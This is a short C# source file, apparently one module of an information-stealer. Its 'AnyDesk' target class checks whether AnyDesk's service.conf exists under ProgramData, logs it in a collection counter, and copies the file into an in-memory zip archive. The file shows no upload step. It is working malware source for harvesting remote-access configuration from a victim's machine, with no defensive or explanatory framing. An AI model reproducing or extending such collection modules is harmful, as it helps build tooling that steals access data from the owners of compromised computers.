using Helper.Data;
using System.IO;

namespace Targets.Applications
{
	public class AnyDesk : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string path = "C:\\ProgramData\\AnyDesk\\service.conf";
	    if (!File.Exists(path))
	      return;
	    string entryPath = "AnyDesk\\service.conf";
	    counter.Applications.Add(new Counter.CounterApplications()
	    {
	      Name = nameof (AnyDesk),
	      Files = {
	        $"{path} => {entryPath}"
	      }
	    });
	    zip.AddFile(entryPath, File.ReadAllBytes(path));
	  }
	}
}
